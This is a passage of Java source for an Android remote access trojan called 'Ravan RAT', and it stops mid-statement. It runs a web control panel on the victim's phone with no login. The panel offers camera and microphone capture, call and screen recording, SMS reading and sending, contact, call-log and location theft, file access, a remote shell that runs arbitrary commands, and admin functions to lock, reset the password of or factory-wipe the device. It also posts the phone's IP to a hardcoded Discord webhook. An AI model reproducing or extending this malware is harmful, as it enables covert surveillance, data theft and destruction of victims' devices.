package com.security.ravan;
import android.Manifest;
import android.app.admin.DevicePolicyManager;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.location.Location;
import android.location.LocationManager;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import android.util.Log;
import fi.iki.elonen.NanoHTTPD;

public class RavanHttpServer extends NanoHTTPD {

    private final Context context;
    private static final String PREFS_NAME = "RavanRATPrefs";
    private static final String PREF_AUTO_SCREEN_RECORD_BOOT = "auto_screen_record_on_boot";
    private static final String DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1519769648697049320/9D1rrVjcvLDjHp5s2fWwXWiTWwdGLiYRm073v1rwbvDzKg917iwGkL8Jk9NbG0_2ufq5";

    private static final String HTML_HEADER = "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
            "<title>Ravan RAT</title>" +
            "<style>" +
            "* { margin: 0; padding: 0; box-sizing: border-box; }" +
            "body {" +
            "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;" +
            "background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);" +
            "min-height: 100vh;" +
            "color: #e8e8e8;" +
            "}" +
            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; }" +
            ".header { text-align: center; padding: 30px 0; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 30px; }"
            +
            ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
            +
            ".header p { color: #888; }" +
            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
            ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
            +
            ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
            ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
            +
            ".file-list { list-style: none; }" +
            ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
            +
            ".file-item:hover { background: rgba(255,255,255,0.08); border-color: rgba(233, 69, 96, 0.3); }" +
            ".file-icon { width: 45px; height: 45px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.3rem; }"
            +
            ".folder-icon { background: linear-gradient(135deg, #f39c12, #f1c40f); }" +
            ".file-icon-default { background: linear-gradient(135deg, #3498db, #2980b9); }" +
            ".file-icon-image { background: linear-gradient(135deg, #9b59b6, #8e44ad); }" +
            ".file-icon-video { background: linear-gradient(135deg, #e74c3c, #c0392b); }" +
            ".file-icon-audio { background: linear-gradient(135deg, #1abc9c, #16a085); }" +
            ".file-icon-doc { background: linear-gradient(135deg, #2ecc71, #27ae60); }" +
            ".file-info { flex: 1; }" +
            ".file-name { color: #fff; text-decoration: none; font-weight: 500; display: block; margin-bottom: 4px; }" +
            ".file-name:hover { color: #e94560; }" +
            ".file-meta { font-size: 0.85rem; color: #888; }" +
            ".breadcrumb { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; }"
            +
            ".breadcrumb a { color: #e94560; text-decoration: none; }" +
            ".breadcrumb span { color: #666; }" +
            "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
            "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
            "td { font-size: 0.9rem; }" +
            "tr:hover { background: rgba(255,255,255,0.03); }" +
            ".call-incoming { color: #2ecc71; }" +
            ".call-outgoing { color: #3498db; }" +
            ".call-missed { color: #e74c3c; }" +
            ".contact-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e94560, #ff6b6b); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }"
            +
            ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
            ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
            ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
            +
            ".info-label { color: #888; font-size: 0.85rem; }" +
            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
            ".action-button { padding: 25px 15px; border-radius: 15px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.3s ease; border: 1px solid rgba(255,255,255,0.12); color: #fff; }" +
            ".action-button:hover { transform: translateY(-2px); box-shadow: 0 14px 30px rgba(233, 69, 96, 0.18); }" +
            ".glow-red { background: linear-gradient(135deg, #ff4d4d, #c0392b); box-shadow: 0 0 20px rgba(255, 0, 0, 0.45); border-color: rgba(255,255,255,0.18); }" +
            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
            ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
            +
            ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
            ".pagination .active { background: #e94560; }" +
            "@media (max-width: 768px) { " +
            ".header h1 { font-size: 1.8rem; } " +
            ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
            "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
            ".info-grid { grid-template-columns: 1fr; } " +
            "}" +
            "</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "<div class=\"header\">" +
            "<h1>Ravan RAT</h1>" +
            "</div>" +
            "<div class=\"nav\">" +
            "<a href=\"/\">Home</a>" +
            "<a href=\"/device\">Device Info</a>" +
            "<a href=\"/camera\">Camera</a>" +
            "<a href=\"/audio\">Audio</a>" +
            "<a href=\"/location\">Location</a>" +
            "<a href=\"/files\">Files</a>" +
            "<a href=\"/admin\">Admin Power</a>" +
            "<a href=\"/notifications\">Notifications</a>" +
            "<a href=\"/logs\">Logs</a>" +
            "<a href=\"/calls\">Call Logs</a>" +
            "<a href=\"/contacts\">Contacts</a>" +
            "<a href=\"/sms\">SMS</a>" +
            "<a href=\"/shell\">Shell</a>" +
            "</div>";

    private static final String HTML_FOOTER = "</div>" +
            "</body>" +
            "</html>";

    public RavanHttpServer(Context context, int port) {
        super(port);
        this.context = context;
    }

    public void reportIpToDiscord() {
        if (DISCORD_WEBHOOK_URL == null || DISCORD_WEBHOOK_URL.isEmpty()) {
            return;
        }
        try {
            String ip = getLocalIpAddress();
            String json = "{\"content\": \"📱 **Phone IP:** " + ip + "\"}";

            URL url = new URL(DISCORD_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            Log.d("RavanHttp", "IP sent to Discord: " + ip + " (response=" + responseCode + ")");
            RATLogger.log("Manual IP send to Discord succeeded: " + ip);
        } catch (Exception e) {
            Log.e("RavanHttp", "Failed to send IP to Discord: " + e.getMessage());
            RATLogger.log("Manual IP send to Discord failed: " + e.getMessage());
        }
    }

    private String getLocalIpAddress() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces != null && interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "127.0.0.1";
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        try {
            if (uri.equals("/") || uri.isEmpty()) {
                return serveHome();
            } else if (uri.equals("/send-ip")) {
                return handleSendIp();
            } else if (uri.equals("/logs")) {
                return serveLogsPage();
            } else if (uri.equals("/api/logs")) {
                return serveLogsApi();
            } else if (uri.equals("/api/logs/clear") && session.getMethod() == Method.POST) {
                return clearLogsApi();
            } else if (uri.equals("/device")) {
                return serveDeviceInfo();
            } else if (uri.equals("/admin")) {
                return serveAdminPage();
            } else if (uri.equals("/admin/status")) {
                return serveAdminStatus();
            } else if (uri.equals("/admin/lock") && session.getMethod() == Method.POST) {
                return performAdminLock();
            } else if (uri.equals("/admin/wipe") && session.getMethod() == Method.POST) {
                return performAdminWipe();
            } else if (uri.equals("/admin/camera") && session.getMethod() == Method.POST) {
                return performAdminCameraToggle(session);
            } else if (uri.equals("/admin/password") && session.getMethod() == Method.POST) {
                return performAdminPasswordReset(session);
            } else if (uri.equals("/location")) {
                return serveLocationPage();
            } else if (uri.equals("/location/get")) {
                return serveLocationData();
            } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                return serveFiles(uri, params);
            } else if (uri.equals("/calls")) {
                return serveCallLogs(params);
            } else if (uri.equals("/contacts")) {
                return serveContacts(params);
            } else if (uri.equals("/sms")) {
                return serveSmsPage(params);
            } else if (uri.equals("/sms/read")) {
                return serveSmsRead(params);
            } else if (uri.equals("/sms/send")) {
                return serveSmsSend(params);
            } else if (uri.equals("/sms/delete")) {
                return serveSmsDelete(params);
            } else if (uri.equals("/notifications")) {
                return serveNotificationsPage();
            } else if (uri.equals("/api/notifications")) {
                return serveNotificationsApi(session);
            } else if (uri.equals("/api/notifications/clear") && session.getMethod() == Method.POST) {
                return serveNotificationsClear();
            } else if (uri.equals("/api/notifications/delete") && session.getMethod() == Method.POST) {
                return serveNotificationsDelete(session);
            } else if (uri.equals("/api/notifications/settings")) {
                return serveNotificationsSettings();
            } else if (uri.equals("/camera")) {
                return serveCameraPage();
            } else if (uri.equals("/camera/capture")) {
                return serveCameraCapture(params);
            } else if (uri.equals("/camera/photo")) {
                return serveCameraPhoto(params);
            } else if (uri.equals("/camera/live")) {
                return serveLiveStreamPage(params);
            } else if (uri.equals("/camera/stream")) {
                return serveMJPEGStream(params);
            } else if (uri.equals("/camera/frame")) {
                return serveSingleFrame();
            } else if (uri.equals("/camera/start-stream")) {
                return startCameraStream(params);
            } else if (uri.equals("/camera/stop-stream")) {
                return stopCameraStream();
            } else if (uri.equals("/camera/record")) {
                return startVideoRecording(params);
            } else if (uri.equals("/camera/stop-record")) {
                return stopVideoRecording();
            } else if (uri.equals("/camera/status")) {
                return serveCameraStatus();
            } else if (uri.equals("/screen")) {
                return serveScreenPage();
            } else if (uri.equals("/screen/start_record")) {
                return startScreenRecording();
            } else if (uri.equals("/screen/stop_record")) {
                return stopScreenRecording();
            } else if (uri.equals("/screen/start")) {
                return startScreenCapture();
            } else if (uri.equals("/screen/stop")) {
                return stopScreenCapture();
            } else if (uri.equals("/screen/frame")) {
                return serveScreenFrame();
            } else if (uri.equals("/screen/status")) {
                return serveScreenStatus();
            } else if (uri.equals("/screen/settings")) {
                return updateScreenSettings(params);
            } else if (uri.equals("/file/delete")) {
                return deleteFile(params);
            } else if (uri.startsWith("/download/")) {
                return serveDownload(uri);
            } else if (uri.equals("/audio")) {
                return serveAudioPage();
            } else if (uri.equals("/shell")) {
                return serveShellPage();
            } else if (uri.equals("/shell/run")) {
                return serveShellRun(session);
            } else if (uri.equals("/audio/mic/start")) {
                return startMicRecording(params);
            } else if (uri.equals("/audio/mic/stop")) {
                return stopMicRecording();
            } else if (uri.equals("/audio/call/start")) {
                return startCallRecording(params);
            } else if (uri.equals("/audio/call/stop")) {
                return stopCallRecording();
            } else if (uri.equals("/audio/status")) {
                return serveAudioStatus();
            } else if (uri.equals("/audio/settings")) {
                return updateAudioSettings(params);
            } else if (uri.equals("/audio/recordings")) {
                return serveAudioRecordings();
            } else {
                return serve404();
            }
        } catch (Exception e) {
            return serveError(e.getMessage());
        }
    }

    private Response serveHome() {
        String ipv6 = MainActivity.getLocalIPv6Address();
        String ipDisplay = (ipv6 != null ? ipv6 : "Not Available");

        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Device Status</h2>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">"
                +
                "<div style=\"padding: 20px; background: rgba(46, 204, 113, 0.1); border-radius: 10px; border-left: 4px solid #2ecc71;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">Server Status</div>" +
                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #2ecc71;\">Online</div>" +
                "</div>" +
                "<div style=\"padding: 20px; background: rgba(52, 152, 219, 0.1); border-radius: 10px; border-left: 4px solid #3498db;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">Port</div>" +
                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #3498db;\">8080</div>" +
                "</div>" +
                "<div style=\"padding: 20px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border-left: 4px solid #e94560;\">"
                +
                "<div style=\"font-size: 0.9rem; color: #888;\">IPv6 Address</div>" +
                "<div style=\"font-size: 0.9rem; font-weight: bold; color: #e94560; word-break: break-all;\">"
                + ipDisplay + "</div>" +
                "</div>" +
                "</div>" +
                "<div style=\"margin: 20px 0; text-align: center;\">" +
                "<button onclick=\"sendIpToDiscord()\" style=\"padding: 14px 24px; border: none; border-radius: 12px; background: linear-gradient(135deg, #7289da, #99aab5); color: #fff; font-size: 1rem; font-weight: 700; cursor: pointer; box-shadow: 0 12px 24px rgba(0,0,0,0.15);\">Send IP to Discord</button>" +
                "<div id=\"discord-send-status\" style=\"margin-top: 12px; color:#fff; font-size:0.95rem;\"></div>" +
                "</div>" +
                "<script>function sendIpToDiscord(){document.getElementById('discord-send-status').textContent='Sending...';fetch('/send-ip').then(r=>r.json()).then(d=>{document.getElementById('discord-send-status').textContent=d.message||'Sent to Discord';alert(d.message||'Sent to Discord');}).catch(e=>{document.getElementById('discord-send-status').textContent='Send failed';alert('Send failed: '+e);});}</script>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">" +
                "<a class=\"action-button\" href=\"/camera\" style=\"background: linear-gradient(135deg, rgba(231, 76, 60, 0.22), rgba(192, 57, 43, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128247;</div>" +
                "<div style=\"font-weight: 600; color: #e74c3c;\">Camera</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/screen\" style=\"background: linear-gradient(135deg, rgba(241, 196, 15, 0.22), rgba(243, 156, 18, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128187;</div>" +
                "<div style=\"font-weight: 600; color: #f1c40f;\">Screen</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/sms\" style=\"background: linear-gradient(135deg, rgba(52, 152, 219, 0.22), rgba(41, 128, 185, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128241;</div>" +
                "<div style=\"font-weight: 600; color: #3498db;\">SMS</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/shell\" style=\"background: linear-gradient(135deg, rgba(155, 89, 182, 0.22), rgba(142, 68, 173, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128187;</div>" +
                "<div style=\"font-weight: 600; color: #9b59b6;\">Shell</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/audio\" style=\"background: linear-gradient(135deg, rgba(26, 188, 156, 0.22), rgba(22, 160, 133, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#127908;</div>" +
                "<div style=\"font-weight: 600; color: #1abc9c;\">Audio</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/location\" style=\"background: linear-gradient(135deg, rgba(46, 204, 113, 0.22), rgba(39, 174, 96, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128205;</div>" +
                "<div style=\"font-weight: 600; color: #2ecc71;\">Location</div>" +
                "</a>" +
                "<a class=\"action-button\" href=\"/files\" style=\"background: linear-gradient(135deg, rgba(52, 73, 94, 0.22), rgba(44, 62, 80, 0.15));\">" +
                "<div style=\"font-size: 2rem;\">&#128193;</div>" +
                "<div style=\"font-weight: 600; color: #34495e;\">Files</div>" +
                "</a>" +
                "<a class=\"action-button glow-red\" href=\"/admin\" style=\"color:#fff;\">" +
                "<div style=\"font-size: 2rem;\">&#9881;</div>" +
                "<div style=\"font-weight: 600;\">Admin Power</div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response handleSendIp() {
        try {
            reportIpToDiscord();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"IP sent to Discord\"}");
        } catch (Exception e) {
            String error = escapeJson(e.getMessage() != null ? e.getMessage() : "Unknown error");
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Failed to send IP: " + error + "\"}");
        }
    }

    private Response serveLogsPage() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Logs</h2>" +
                "<div style=\"display:flex; gap:12px; flex-wrap:wrap; margin-bottom:16px;\">" +
                "<button onclick=\"refreshLogs()\" style=\"padding:12px 22px; border:none; border-radius:12px; background:#7289da; color:#fff; font-weight:700; cursor:pointer;\">Refresh</button>" +
                "<button onclick=\"clearLogs()\" style=\"padding:12px 22px; border:none; border-radius:12px; background:#e74c3c; color:#fff; font-weight:700; cursor:pointer;\">Clear Logs</button>" +
                "</div>" +
                "<div id=\"logs-container\" style=\"background:rgba(255,255,255,0.05); border-radius:14px; padding:18px; min-height:320px; color:#e8e8e8; font-family:monospace; white-space:pre-wrap; line-height:1.5;\">Loading logs...</div>" +
                "<script>" +
                "function refreshLogs(){fetch('/api/logs').then(r=>r.json()).then(d=>{document.getElementById('logs-container').textContent=d.logs.join('\n');}).catch(e=>{document.getElementById('logs-container').textContent='Failed to load logs';});}" +
                "function clearLogs(){fetch('/api/logs/clear',{method:'POST'}).then(r=>r.json()).then(d=>{refreshLogs(); alert(d.message || 'Logs cleared');}).catch(e=>{alert('Clear failed: '+e);});}" +
                "setInterval(refreshLogs,5000);refreshLogs();" +
                "</script>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveLogsApi() {
        StringBuilder json = new StringBuilder();
        json.append("{\"logs\":[");
        boolean first = true;
        for (String entry : RATLogger.getLogs()) {
            if (!first) {
                json.append(",");
            }
            first = false;
            json.append("\"").append(escapeJson(entry)).append("\"");
        }
        json.append("]}");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json.toString());
    }

    private Response clearLogsApi() {
        RATLogger.clearLogs();
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"Logs cleared\"}");
    }

    private Response serveShellPage() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">&#128187; Remote Shell</h2>" +
                "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 20px;\">Enter a shell command and execute it on the device.</p>" +
                "<div style=\"margin-bottom: 20px;\">" +
                "<input id=\"command-input\" type=\"text\" placeholder=\"Enter command...\" style=\"width:100%; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.05); color:#fff; font-size:1rem;\" />" +
                "</div>" +
                "<button onclick=\"runShellCommand()\" style=\"padding: 14px 28px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 1rem;\">Run</button>" +
                "<div style=\"margin-top: 25px;\">" +
                "<div style=\"color: #888; margin-bottom: 10px; font-size: 0.95rem;\">Output</div>" +
                "<pre id=\"command-output\" style=\"white-space: pre-wrap; word-break: break-word; min-height: 240px; padding: 20px; border-radius: 14px; background: rgba(255,255,255,0.05); color:#e8e8e8; font-size:0.95rem; overflow-x:auto;\">Command output will appear here.</pre>" +
                "</div>" +
                "<script>" +
                "function runShellCommand() {" +
                "  const cmd = document.getElementById('command-input').value.trim();" +
                "  const output = document.getElementById('command-output');" +
                "  if (!cmd) { output.textContent = 'Enter a command first.'; return; }" +
                "  output.textContent = 'Running...';" +
                "  fetch('/shell/run', {" +
                "    method: 'POST'," +
                "    headers: { 'Content-Type': 'application/x-www-form-urlencoded' } ," +
                "    body: 'command=' + encodeURIComponent(cmd)" +
                "  }).then(r => r.json()).then(data => {" +
                "    if (data.success) { output.textContent = data.output || 'No output'; } else { output.textContent = 'ERROR: ' + data.error; }" +
                "  }).catch(e => { output.textContent = 'Request failed: ' + e.message; });" +
                "}" +
                "</script>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveShellRun(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            String command = session.getParms().get("command");
            if (command == null || command.trim().isEmpty()) {
                String postData = files.get("postData");
                if (postData != null && postData.contains("command=")) {
                    command = postData.replaceFirst("^command=", "");
                    command = java.net.URLDecoder.decode(command, "UTF-8");
                }
            }
            if (command == null || command.trim().isEmpty()) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"Missing command\"}");
            }
            String output = executeShellCommand(command.trim());
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"output\":\"" + escapeJson(output) + "\"}");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private String executeShellCommand(String command) throws java.io.IOException, InterruptedException {
        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        String stdout = readStream(process.getInputStream());
        String stderr = readStream(process.getErrorStream());
        int exitCode = process.waitFor();
        StringBuilder result = new StringBuilder();
        if (!stdout.isEmpty()) {
            result.append(stdout);
        }
        if (!stderr.isEmpty()) {
            if (result.length() > 0) {
                result.append("\n");
            }
            result.append(stderr);
        }
        result.append("\nExit code: ").append(exitCode);
        return result.toString().trim();
    }

    private String readStream(java.io.InputStream stream) {
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(stream))) {
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                if (output.length() > 0) {
                    output.append("\n");
                }
                output.append(line);
            }
            return output.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private String urlDecode(String value) {
        try {
            return java.net.URLDecoder.decode(value, "UTF-8");
        } catch (Exception e) {
            return value;
        }
    }

    private Response serveDeviceInfo() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Device Information</h2>" +
                DeviceInfo.getDeviceInfoHtml(context) +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private DevicePolicyManager getDevicePolicyManager() {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    private android.content.ComponentName getAdminComponent() {
        return new android.content.ComponentName(context, AdminReceiver.class);
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = getDevicePolicyManager();
        return dpm != null && dpm.isAdminActive(getAdminComponent());
    }

    private Response serveAdminPage() {
        boolean active = isDeviceAdminActive();
        DevicePolicyManager dpm = getDevicePolicyManager();
        boolean cameraDisabled = false;
        try {
            if (dpm != null) {
                // Camera state cannot be queried safely on all Android versions.
            }
        } catch (Exception ignored) {
        }

        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 10px;\">Admin Power</h2>" +
                "<p style=\"color: #888; font-size: 0.95rem; margin-bottom: 20px;\">Device Administrator controls for lock, password, camera and factory reset.</p>" +
                "<div class=\"info-grid\">" +
                "<div class=\"info-item\"><div class=\"info-label\">Device Admin Status</div><div id=\"admin-status\" class=\"info-value\" style=\"color: " + (active ? "#2ecc71" : "#e74c3c") + "; font-weight: 700;\">" + (active ? "Active" : "Inactive") + "</div></div>" +
                "<div class=\"info-item\"><div class=\"info-label\">Camera Disabled</div><div id=\"camera-status\" class=\"info-value\" style=\"color: #f1c40f; font-weight: 700;\">" + (cameraDisabled ? "Yes" : "No") + "</div></div>" +
                "</div>" +
                "<div style=\"display: grid; gap: 16px; margin-top: 25px;\">" +
                "<button onclick=\"performAdminAction('/admin/lock')\" class=\"action-button\" style=\"background: linear-gradient(135deg, rgba(46, 204, 113, 0.22), rgba(39, 174, 96, 0.15)); color: #2ecc71;\">" +
                "<div style=\"font-size: 1.5rem;\">&#128274;</div>" +
                "<div style=\"font-weight: 700;\">Lock Device</div>" +
                "</button>" +
                "<button onclick=\"confirmFactoryReset()\" class=\"action-button\" style=\"background: linear-gradient(135deg, rgba(231, 76, 60, 0.22), rgba(192, 57, 43, 0.15)); color: #e74c3c;\">" +
                "<div style=\"font-size: 1.5rem;\">&#128165;</div>" +
                "<div style=\"font-weight: 700;\">Factory Reset</div>" +
                "</button>" +
                "<button id=\"camera-toggle-btn\" onclick=\"toggleCamera()\" class=\"action-button\" style=\"background: linear-gradient(135deg, rgba(52, 152, 219, 0.22), rgba(41, 128, 185, 0.15)); color: #3498db;\">" +
                "<div style=\"font-size: 1.5rem;\">&#128247;</div>" +
                "<div style=\"font-weight: 700;\">" + (cameraDisabled ? "Enable Camera" : "Disable Camera") + "</div>" +
                "</button>" +
                "<div style=\"background: rgba(255,255,255,0.05); border-radius: 15px; padding: 20px;\">" +
                "<div style=\"font-size: 0.95rem; color: #888; margin-bottom: 12px;\">Set Lock Screen Password</div>" +
                "<input id=\"password-input\" type=\"password\" placeholder=\"New password...\" style=\"width:100%; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,0.12); background:rgba(255,255,255,0.05); color:#fff; margin-bottom: 12px;\" />" +
                "<button onclick=\"setPassword()\" class=\"action-button\" style=\"background: linear-gradient(135deg, rgba(241, 196, 15, 0.22), rgba(243, 156, 18, 0.15)); color: #f1c40f;\">" +
                "<div style=\"font-size: 1.5rem;\">&#128272;</div>" +
                "<div style=\"font-weight: 700;\">Set Password</div>" +
                "</button>" +
                "</div>" +
                "</div>" +
                "<div id=\"admin-message\" style=\"margin-top: 20px; padding: 16px; border-radius: 14px; display: none; background: rgba(255,255,255,0.08); color: #fff; font-size: 0.95rem;\"></div>" +
                "<script>" +
                "function handleResponse(response) { return response.json(); }" +
                "function showAdminMessage(text, success) { const el = document.getElementById('admin-message'); el.style.display='block'; el.style.background = success ? 'rgba(46, 204, 113, 0.18)' : 'rgba(231, 76, 60, 0.18)'; el.style.color = success ? '#2ecc71' : '#e74c3c'; el.innerText = text; }" +
                "function performAdminAction(path) { fetch(path, { method:'POST' }).then(handleResponse).then(data => { if (data.success) { showAdminMessage(data.message || 'Action completed', true); updateStatus(); } else { showAdminMessage(data.error || 'Action failed', false); } }).catch(e => { showAdminMessage('Request failed: '+e.message, false); }); }" +
                "function confirmFactoryReset() { if (!confirm('Factory reset will wipe the device. Continue?')) return; performAdminAction('/admin/wipe'); }" +
                "function toggleCamera() { const current = document.getElementById('camera-status').innerText.trim() === 'Yes'; const body = 'disable=' + (!current); fetch('/admin/camera', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: body }).then(handleResponse).then(data => { if (data.success) { showAdminMessage(data.message || 'Camera state changed', true); updateStatus(); } else { showAdminMessage(data.error || 'Camera action failed', false); } }).catch(e => { showAdminMessage('Request failed: '+e.message, false); }); }" +
                "function setPassword() { const pw = document.getElementById('password-input').value.trim(); if (!pw) { showAdminMessage('Enter a password first', false); return; } fetch('/admin/password', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'password='+encodeURIComponent(pw) }).then(handleResponse).then(data => { if (data.success) { showAdminMessage(data.message || 'Password updated', true); } else { showAdminMessage(data.error || 'Password update failed', false); } }).catch(e => { showAdminMessage('Request failed: '+e.message, false); }); }" +
